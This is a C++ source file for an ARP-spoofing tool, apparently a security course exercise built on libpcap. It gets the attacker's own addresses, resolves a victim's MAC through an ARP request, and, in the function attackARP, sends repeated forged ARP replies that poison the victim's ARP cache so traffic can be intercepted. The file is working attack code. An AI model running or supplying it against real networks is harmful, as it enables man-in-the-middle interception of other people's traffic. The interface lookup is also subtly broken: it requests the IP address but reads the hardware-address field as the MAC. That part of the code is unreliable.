#include "send-arp.hpp"

/*
 * Get Attacker's local MAC address and IP address
*/
bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
    int sockfd;
    struct ifreq ifr = {0, };

    // Make socket which domain is IPv4 and type is UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(sockfd == -1) {
        std::cerr << CREATE_SOCKET_ERROR_MSG;
        return false;
    }

    ifr.ifr_addr.sa_family = AF_INET;

    // Put interface name to ifreq
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);

    // IO control to get MAC
    if(ioctl(sockfd, SIOCGIFADDR, &ifr)) {
        std::cerr << IOCTL_ERROR_MSG;
        return false;
    }

    MAC = (uint8_t *)ifr.ifr_hwaddr.sa_data;
    IP = ((sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;

    close(sockfd);

    return true;
}

bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip& myIP) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    struct ArpHdr* ARPHeader;
    
    sendPacketARP(pcap, Mac::broadcastMac(), myMAC, myMAC, myIP, Mac::nullMac(), IP, ArpHdr::Request);

    while( true ) {
        res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
		// PCAP_ERROR : When interface is down
		if (res == PCAP_ERROR or res == PCAP_ERROR_BREAK) {
			std::cout << PCAP_RECEIVE_PACKET_ERROR;
			std::cout << pcap_geterr(pcap) << std::endl;

			break;
		}
		
		if(packet == NULL) continue;

        // Receive ARP packet, so check if it is response of our request!
        ARPHeader = (struct ArpHdr*)(packet + sizeof(struct EthHdr));

        if(ArpHdr::Reply == ARPHeader->op()   and 
           myIP          == ARPHeader->tip()  and 
           myMAC         == ARPHeader->tmac() and 
           IP            == ARPHeader->sip()) break;
    }

    MAC = ARPHeader->smac();

    return true;
}

/*
 * Send ARP packet using pcap
*/
bool sendPacketARP(pcap_t* pcap, 
                   const Mac& destMAC, const Mac& sourceMAC,
                   const Mac& sendMAC, const Ip& sendIP, 
                   const Mac& targetMAC, const Ip& targetIP, 
                   ArpHdr::Mode mode) {
    EthArpPacket packet;

    // Set Ethernet header
    packet.eth_.dmac_ = destMAC;
	packet.eth_.smac_ = sourceMAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

    // Set ARP Header
	packet.arp_.hrd_  = htons(ArpHdr::ETHER);
	packet.arp_.pro_  = htons(EthHdr::Ipv4);
	packet.arp_.hln_  = Mac::SIZE;
	packet.arp_.pln_  = Ip::SIZE;
	packet.arp_.op_   = htons(mode);
	packet.arp_.smac_ = sendMAC;
	packet.arp_.sip_  = htonl(sendIP);
	packet.arp_.tmac_ = targetMAC;
	packet.arp_.tip_  = htonl(targetIP);

    if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket))) {
        std::cerr << SEND_PACKET_ERROR_MSG;
        std::cerr << pcap_geterr(pcap) << std::endl;
        return false;
    }

    return true;
}

bool attackARP(pcap_t* pcap, 
               const Mac& sendMAC, const Ip& sendIP, 
               const Mac& myMAC, const Ip& targetIP) {
    for(int i = 0; i < 10; i++) {
        if(not sendPacketARP(pcap, sendMAC, myMAC, myMAC, targetIP, sendMAC, sendIP, ArpHdr::Reply)) {
            return false;
        }
    }

    return true;
}